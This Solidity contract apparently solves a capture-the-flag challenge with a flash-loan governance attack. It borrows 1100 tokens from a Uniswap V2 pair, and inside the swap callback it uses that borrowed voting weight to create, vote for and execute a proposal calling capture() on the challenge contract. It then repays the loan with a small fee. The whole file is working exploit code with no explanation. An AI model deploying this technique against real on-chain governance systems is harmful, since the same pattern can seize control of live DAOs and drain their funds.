//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";

interface IGovernor {
    function addProposal(bytes calldata payload, address to) external returns(uint);
    function executeProposal(uint proposalIndex) external;
    function vote(uint proposalIndex, bool support) external;
}

contract FlashLoan {
    IUniswapV2Pair pair;
    IERC20 erc20;
    IGovernor gov;
    address challenge;

    constructor(IUniswapV2Pair _pair, IERC20 _erc20, IGovernor _gov, address _challenge) {
        pair = _pair;
        erc20 = _erc20;
        gov = _gov;
        challenge = _challenge;
    }

    function execute() external {
        pair.swap(1100 * 10 ** 18, 0, address(this), "0xa");
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        uint proposalId = gov.addProposal(abi.encodeWithSignature("capture()"), challenge);
        gov.vote(proposalId, true);
        gov.executeProposal(proposalId);

        erc20.transfer(msg.sender, 1104 * 10 ** 18);
    }
}